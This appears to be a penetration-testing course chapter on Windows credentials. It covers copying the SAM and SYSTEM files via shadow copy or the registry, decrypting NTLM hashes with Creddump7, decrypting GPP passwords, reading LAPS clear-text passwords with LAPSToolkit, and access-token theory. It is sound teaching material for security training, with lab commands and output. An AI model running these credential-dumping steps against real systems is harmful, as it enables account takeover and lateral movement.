Windows implements a variety of authentication and post-authentication privilege mechanisms that can become quite complex in an Active Directory environment.

In this module, we'll discuss Windows credentials and present attack vectors that leverage or disclose them. We'll begin with an investigation into local authentication credentials and discuss post-authentication privileges as well as Active Directory authentication and Kerberos.

## 15.1. Local Windows Credentials

Windows can authenticate local user accounts as well as those belonging to a domain, which are stored within Active Directory.

In this section, we'll discuss credentials for local user accounts and demonstrate how they can be used as part of an attack chain.

### 15.1.1. SAM Database

Local Windows credentials are stored in the _Security Account Manager_ (SAM) database[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-1) as password hashes using the NTLM hashing format,[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-2) which is based on the _MD4_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-3) algorithm.

We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine.

Although it is rare to find matching local credentials between disparate machines, the built-in default-named _Administrator_ account[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-4) is installed on all Windows-based machines.

This account has been disabled on desktop editions since Windows Vista, but it is enabled on servers by default. To ease administrative tasks, system administrators often enable this default account on desktop editions and set a single shared password.

Given the capability of this attack vector, let’s walk through an example. In this case, we’ll attack the default local administrator account.

Every Windows account has a unique _Security Identifier_ (SID)[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-5) that follows a specific pattern as shown in Listing 1:

```
S-R-I-S
```

> Listing 1 - Security Identifier format prototype

In this structure, the SID begins with a literal "S" to identify the string as a SID, followed by a _revision level_ (usually set to "1"), an _identifier-authority_ value (often "5") and one or more _subauthority_ values.

The subauthority will always end with a _Relative Identifier_ (RID)[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-6) representing a specific object on the machine.

The local administrator account is sometimes referred to as RID 500 due to its static RID value of 500.

Let's use PowerShell and WMI to locate the SID of the local administrator account on our Windows 10 victim machine.

First, we'll determine the local _computername_ from the associated environment variable and use it with the WMI _Win32_UserAccount_[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-7) class. To obtain results for the local administrator account, we'll specify the _computername_ through the _Domain_ property and the account name through the _Name_ property.

```
PS C:\> $env:computername
CLIENT

PS C:\> [wmi] "Win32_userAccount.Domain='client',Name='Administrator'"


AccountType : 512
Caption     : client\Administrator
Domain      : client
SID         : S-1-5-21-1673717583-1524682655-2710527411-500
FullName    :
Name        : Administrator
```

> Listing 2 - Relative identifier value of 500

The highlighted section of the output (Listing 2) reveals a RID value of 500 as expected.

Next, we'll attempt to obtain credentials for this user account from the SAM database. The SAM is located at C:\Windows\System32\config\SAM, but the SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from an administrative command prompt:

```
C:\>copy c:\Windows\System32\config\sam C:\Users\offsec.corp1\Downloads\sam
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

> Listing 3 - Failure to copy the SAM database

It is possible to perform a physical attack as well by booting the computer off an external media like a USB into a Linux-based operating system and accessing the content of the hard drive.

There are two potential workarounds. First, we could use the _Volume Shadow Copy Server_,[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-8) which can create a snapshot (or "shadow volume") of the local hard drive with _vssadmin_,[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-9) which is installed on Windows 8.1 and later. We can create a new shadow volume with the create shadow option, but this option is only available on server editions[10](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-10) of the tool.

The second approach, which will work on our Windows 10 machine, is to execute this option through WMIC launched from an administrative command prompt.

Specifically, we’ll launch wmic,[11](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-11) specify the shadowcopy class, create a new shadow volume and specify the source drive with "Volume='C:\'". This will create a snapshot of the C drive.

```
C:\> wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{13FB63F9-F631-408A-B876-9032A9609C22}";
};
```

> Listing 4 - Creating a shadow volume

To verify this, we'll run vssadmin and list the existing shadow volumes with list shadows:

```
C:\> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {8e3a3a18-93a6-4b18-bc54-7639a9baf7b2}
   Contained 1 shadow copies at creation time: 11/14/2019 6:53:26 AM
      Shadow Copy ID: {13fb63f9-f631-408a-b876-9032a9609c22}
         Original Volume: (C:)\\?\Volume{a74776de-f90e-4e66-bbeb-1e507d7fa0d4}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Client.corp1.com
         Service Machine: Client.corp1.com
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

> Listing 5 - Listing shadow volumes

Now that we've confirmed the creation of the shadow volume, we can copy the SAM database from it using the source path highlighted in the output of Listing 5:

```
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
        1 file(s) copied.
```

> Listing 6 - Shadow copying the SAM database

Note that the above command must be run from a standard cmd.exe prompt, not from a PowerShell prompt.

Although we have copied the SAM database, it is partially encrypted by either RC4 (Windows 10 prior to Anniversary edition also called 1607 or RS1) or AES[12](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-12) (Anniversary edition and newer). The encryption keys are stored in the _SYSTEM_ file, which is in the same folder as the SAM database. However, it is also locked by the _SYSTEM_ account. We can reuse our shadow volume copy to copy this file as well:

```
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
        1 file(s) copied.
```

> Listing 7 - Shadow copying the SYSTEM file

We can also obtain a copy of the SAM database and SYSTEM files from the registry in the HKLM\sam and HKLM\system hives, respectively. Administrative permissions are required to read and copy.

For example, we'll use the reg save[13](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-13) command to save the content to the hard disk by specifying the registry hive and the output file name and path:

```
C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
The operation completed successfully.

C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
The operation completed successfully.
```

> Listing 8 - Saving SAM and SYSTEM from the registry

Regardless of how we obtain the SAM database and SYSTEM file, we must decrypt them. At the time of writing, the only two tools that can decrypt these files are _Mimikatz_ and _Creddump7_.[14](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5349-14) In this example, we'll use Creddump.

First, we'll install the _python-crypto_ library, and then clone Creddump from the GitHub repository with git clone:

```
kali@kali:~$ sudo apt install python-crypto
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...

kali@kali:~$ sudo git clone https://github.com/Neohapsis/creddump7
Cloning into 'creddump7'...
remote: Enumerating objects: 73, done.
remote: Total 73 (delta 0), reused 0 (delta 0), pack-reused 73
Unpacking objects: 100% (73/73), done.
```

> Listing 9 - Download Creddrump7 project

Next, we'll copy the SAM and SYSTEM files from the Windows 10 victim machine to our Kali Linux machine and use the pwdump.py python script from Creddrump7 to decrypt the NTLM hashes as shown in Listing 10.

```
kali@kali:~$ cd creddump7/

kali@kali:~/creddump7$ python pwdump.py /home/kali/system /home/kali/sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e6178f16bccb14659f6c5228b070e0bf:::
```

> Listing 10 - Decrypting SAM database with pwdump.py

As shown in the highlighted section of Listing 10, we have successfully decrypted the SAM database and obtained the NTLM password hash for the local administrator account.

In this section, we have executed this process manually to demonstrate the individual steps. However, many post-exploitation frameworks can automate this process as well.

In the next section, we'll examine how Microsoft has attempted to mitigate the risk of this attack vector.

#### Exercises

1. Dump the SAM and SYSTEM files using a Volume Shadow copy and decrypt the NTLM hashes with Creddump7.
2. Obtain the NTLM hash for the local administrator account by dumping the SAM and SYSTEM files from the registry.
3. Run a Meterpreter agent on the Windows 10 client and use _hashdump_ to dump the NTLM hashes.

1

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Security_Account_Manager](https://en.wikipedia.org/wiki/Security_Account_Manager) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-1)

2

(Péter Gombos, 2018), [https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-2)

3

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/MD4](https://en.wikipedia.org/wiki/MD4) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-3)

4

(Microsoft, 2019), [https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-4)

5

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Security_Identifier](https://en.wikipedia.org/wiki/Security_Identifier) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-5)

6

(Microsoft, 2018), [https://msdn.microsoft.com/en-us/library/windows/desktop/ms721604(v=vs.85).aspx#_security_relative_identifier_gly](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721604\(v=vs.85\).aspx#_security_relative_identifier_gly) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-6)

7

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-useraccount](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-useraccount) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-7)

8

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview](https://docs.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-8)

9

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-9)

10

(Microsoft, 2016), [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055\(v=ws.11\)?redirectedfrom=MSDN) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-10)

11

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-11)

12

(tijl, 2017), [https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/](https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-12)

13

(Microsoft, 2017), [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-13)

14

(Neohapsis, 2018), [https://github.com/Neohapsis/creddump7](https://github.com/Neohapsis/creddump7) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5349-14)

### 15.1.2. Hardening the Local Administrator Account

Although disabling the Administrator account would block this attack vector, many organizations rely on it for various applications and administrative tasks.

In an attempt to prevent attacks that leverage shared Administrator passwords, Microsoft introduced _Group Policy Preferences_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-1) with Windows Server 2008, which included the ability to (among other things) centrally change local administrator account passwords. However, this approach stored data in an XML file in a _SYSVOL_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-2) folder, which must be accessible to all computers in Active Directory. This created an obvious security issue since the unhashed local administrator password was stored on an easily-accessible share. To solve this issue, Microsoft AES-256 encrypted them, as shown in the example XML file in Listing 11.

```
<?xml version="1.0" encoding="utf-8" ?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D224D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2015-05-22 05:01:55" uid="{D5FE7352-81E1-42A2-B7DA-118402BE4C33}">
		<Properties action="U" newName="ADSAdmin" fullName="" description"" cpassword="RI133B2WI2CiIOCau1DtrtTe3wdFwzCiWB5PSAxXMDstchJt3bLOUie0BaZ/7rdQjuqTonF3ZWAKa1iRvd4JGQ" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)" expires="2015-05-21" />
	</User>
</Groups>
```

> Listing 11 - XML file for setting local administrator password

The AES-256 encrypted password (highlighted in the listing above) is realistically unbreakable given a strong key. Surprisingly, Microsoft published the AES private key on MSDN,[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-3) effectively breaking their own encryption. The _Get-GPPPassword_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-4) PowerShell script could effectively locate and decrypt any passwords found in affected systems' SYSVOL folder.

As an apparent solution, Microsoft issued a security update in 2014 (MS14-025[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-5)), which removed the ability to create Group Policy Preferences containing passwords. Although these files could no longer be created, existing Group Policy Preferences containing passwords were not removed, meaning some may still exist in the wild.

To again address the issue of centrally managing passwords for the local administrator account, Microsoft released the _Local Administrator Password Solution_ (LAPS)[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-6) in 2015, which offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers.

LAPS introduces two new attributes for the computer object into Active Directory. The first is _ms-mcs-AdmPwdExpirationTime_, which registers the expiration time of a password as directed through a group policy. The second is _ms-mcs-AdmPwd_, which contains the clear text password of the local administrator account.[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-7) This attribute is _confidential_,[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-8) meaning specific read permissions are required to access the content, which is normally assigned through group membership. LAPS uses admpwd.dll to change the local administrator password and push the new password to the _ms-mcs-AdmPwd_ attribute of the associated computer object.

If LAPS is in use, we should try to gain access to the clear text passwords in Active Directory as part of a penetration test. While Microsoft has released a PowerShell toolkit to query LAPS, it is not typically installed on a workstation.

Instead, we can use the _LAPSToolkit_[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-9) PowerShell script, which is essentially a wrapper script around the _PowerView_[10](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-10) Active Directory enumeration PowerShell script.

For example, we'll invoke the Get-LAPSComputers method from LAPSToolkit to list all computers that are set up with LAPS and display the hostname, the clear text password, and the expiration time:

Remember when starting a PowerShell prompt, we must supply the _-exec bypass_ option to disable the default ExecutionPolicy setting.

```
PS C:\Tools> Import-Module .\LAPSToolkit.ps1

PS C:\Tools> Get-LAPSComputers

ComputerName       Password Expiration
------------       -------- ----------
appsrv01.corp1.com          12/14/2019 04:18:03
```

> Listing 12 - Using Get-LAPSComputers to dump LAPS attributes

Although we have discovered the appsrv01 server, which is managed by LAPS, we cannot view the clear text password. In this case, our current user account does not have permissions to read the password, so it is returned as empty.

We can use the Find-LAPSDelegatedGroups method of LAPSToolkit to discover groups that can fully enumerate the LAPS data:

```
PS C:\Tools> Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com       corp1\LAPS Password Readers
```

> Listing 13 - Enumerating LAPS delegated groups

From the output in Listing 13, we find that members of the custom _LAPS Password Readers_ group have read permissions.[11](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5350-11)

Next, we can use PowerView to enumerate members of that group through the Get-NetGroupMember method, supplying the -GroupName option to specify the group name:

```
PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers"

GroupDomain  : corp1.com
GroupName    : LAPS Password Readers
MemberDomain : corp1.com
MemberName   : jeff
MemberSid    : S-1-5-21-1364860144-3811088588-1134232237-1110
IsGroup      : False
MemberDN     : CN=jeff,OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com

GroupDomain  : corp1.com
GroupName    : LAPS Password Readers
MemberDomain : corp1.com
MemberName   : admin
MemberSid    : S-1-5-21-1364860144-3811088588-1134232237-1107
IsGroup      : False
MemberDN     : CN=admin,OU=Corp1Admin,OU=Corp1Users,DC=corp1,DC=com
```

> Listing 14 - Enumerating members of LAPS Password Readers

The output reveals that the _jeff_ and _admin_ users can read the LAPS passwords. These permissions are often given to both help desk employees and system administrators.

Users with these permissions are prime targets during a penetration test since they have access to clear text passwords on a potentially large number of workstations or servers.

For example, we can log in to the Windows 10 victim machine as the _admin_ user and view the LAPS passwords with Get-LAPSComputers:

```
PS C:\Tools> Import-Module .\LAPSToolkit.ps1

PS C:\Tools> Get-LAPSComputers

ComputerName       Password       Expiration
------------       --------       ----------
appsrv01.corp1.com gF3]5n{KsnyMwI 12/14/2019 04:18:03
```

> Listing 15 - Finding the clear text local administrator password

We can use the local administrator password for appsrv01 (highlighted in Listing 15) to remotely log in to this machine and others with matching credentials.

Now that we have an understanding of the local administrator account and potential attack vectors against it, let's investigate how access rights and permissions work after a user has authenticated on Windows.

#### Exercises

1. Repeat the LAPS enumeration and obtain the clear text password using LAPSToolKit from the Windows 10 victim machine.
2. Create a Meterpreter agent on the Windows 10 victim machine and perform the same actions remotely from your Kali Linux machine.

1

(Microsoft, 2016), [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922\(v%3Dws.11\)) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-1)

2

(Microsoft, 2019), [https://social.technet.microsoft.com/wiki/contents/articles/8548.active-directory-sysvol-and-netlogon.aspx](https://social.technet.microsoft.com/wiki/contents/articles/8548.active-directory-sysvol-and-netlogon.aspx) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-2)

3

(Microsoft, 2019), [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-3)

4

(PowerShellMafia, 2017), [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-4)

5

(Microsoft, 2015), [https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-5)

6

(Microsoft, 2017), [https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/](https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-6)

7

(Sean Metcalf, 2016), [https://adsecurity.org/?p=3164](https://adsecurity.org/?p=3164) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-7)

8

(Microsoft, 2017), [https://support.microsoft.com/en-us/help/922836/how-to-mark-an-attribute-as-confidential-in-windows-server-2003-servic](https://support.microsoft.com/en-us/help/922836/how-to-mark-an-attribute-as-confidential-in-windows-server-2003-servic) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-8)

9

(Leo Loobeek, 2018), [https://github.com/leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-9)

10

(PowerShellEmpire, 2016), [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-10)

11

(Microsoft, 2020), [https://gallery.technet.microsoft.com/step-by-step-deploy-local-7c9ef772/file/150657/1/step by step guide to deploy microsoft laps.pdf](https://gallery.technet.microsoft.com/step-by-step-deploy-local-7c9ef772/file/150657/1/step%20by%20step%20guide%20to%20deploy%20microsoft%20laps.pdf) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5350-11)

## 15.2. Access Tokens

Credentials, such as username and password combinations, are used for authentication, but the operating system also must keep track of the user's access rights, i.e. authorization. Windows uses _access tokens_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5351-1) to track these rights, and they are assigned to each process associated with the user.

In this section, we'll discuss access tokens, and explore various ways we can leverage them for privilege escalation.

1

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5351-1)

### 15.2.1. Access Token Theory

An access token is created by the kernel upon user authentication and contains important values that are linked to a specific user through the SID. Access tokens are stored inside the kernel, which prevents us from directly interacting with the token or modifying it.

As penetration testers, we'll focus on two concepts relating to the access token, specifically _integrity levels_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-1) and _privileges_.[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-2)

Windows defines four integrity levels, which determine the level of access: low, medium, high, and system. Low integrity is used with sandbox processes like web browsers. Applications executing in the context of a regular user run at medium integrity, and administrators can execute applications at high integrity. System is typically only used for SYSTEM services.

It's not possible for a process of a certain integrity level to modify a process of higher integrity level but the opposite is possible. This is done to prevent trivial privilege escalation.

Local administrators receive two access tokens when authenticating. The first (which is used by default) is configured to create processes as medium integrity. When a user selects the "Run as administrator" option for an application, the second elevated token is used instead, and allows the process to run at high integrity.

The _User Account Control_ (UAC)[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-3) mechanism links these two tokens to a single user and creates the consent prompt. A local administrator regulated by UAC is sometimes also called a split-token administrator.

Privileges are also included in the access token. They are a set of predefined operating system access rights that govern which actions a process can perform.

Within the access token, privileges are controlled by two bitmasks. The first sets the privileges that are present for that specific token and cannot be modified through any APIs inside the same logon session. The second registers if the present privileges are enabled or disabled and may be dynamically updated through the Win32 _AdjustTokenPrivileges_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-4) API.

For example, we can easily view the available privileges for the current user with whoami from cmd.exe by specifying the /priv flag:

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

> Listing 16 - Listing assigned privileges

Listing 16 shows five privileges.

Although we won't discuss every privilege, let's discuss token privilege modification. The _SeShutdownPrivilege_ privilege allows the user to reboot or shutdown the computer. Since it is listed in the output, it is present in the access token, but it is also disabled.

If we choose to shut down the computer through the shutdown[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-5) command the back-end code will enable the privilege with _AdjustTokenPrivileges_ and then perform the required actions to power off the operating system.

While it is impossible to modify the set of privileges that are associated with an active logon session, it is however possible to add additional privileges that will take effect after the targeted user account logs out and logs back in.

Programmatically this can be done with the Win32 _LsaAddAccountRights_[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-6) API, but more often it would be performed through a group policy or locally through an application like secpol.msc[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-7) as displayed in Figure 1.

![[OffSec/OSEP/Course/z. images/ddaee22e2155a1ffd31ffbb2ac631a0e_MD5.jpg]]

Figure 1: Graphical way of adding privileges to an account

The selected privilege (_SeLoadDriverPrivilege_) yields the permission to load a kernel driver. If we were to apply that privilege to our user, the current token would not be modified, rather a new token would be created once the user logs out and back in again.

As we wrap up this theoretical section, we must discuss two types of access tokens. Each process has a primary access token that originates from the user's token[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-8) created during authentication.

